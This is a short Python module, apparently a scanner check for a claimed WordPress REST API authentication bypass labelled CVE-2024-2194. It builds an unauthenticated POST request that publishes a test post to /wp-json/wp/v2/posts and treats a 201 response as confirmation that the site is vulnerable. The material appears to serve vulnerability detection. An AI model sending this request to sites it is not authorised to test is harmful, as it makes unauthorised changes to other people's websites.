"""
CVE-2024-2194: WordPress REST API Authentication Bypass
Description: A critical vulnerability in WordPress REST API that allows unauthenticated users to create posts
Severity: Critical
CVSS Score: 9.8
Affected Versions: WordPress < 6.4.3
Reference: https://wordpress.org/news/2024/01/wordpress-6-4-3-security-release/
"""

def get_payload():
    return {
        'path': '/wp-json/wp/v2/posts',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json'
        },
        'data': {
            'title': 'Test Post',
            'content': '<!-- wp:paragraph --><p>Test</p><!-- /wp:paragraph -->',
            'status': 'publish'
        }
    }

def check_response(response):
    return response.status_code == 201 and 'id' in response.json() 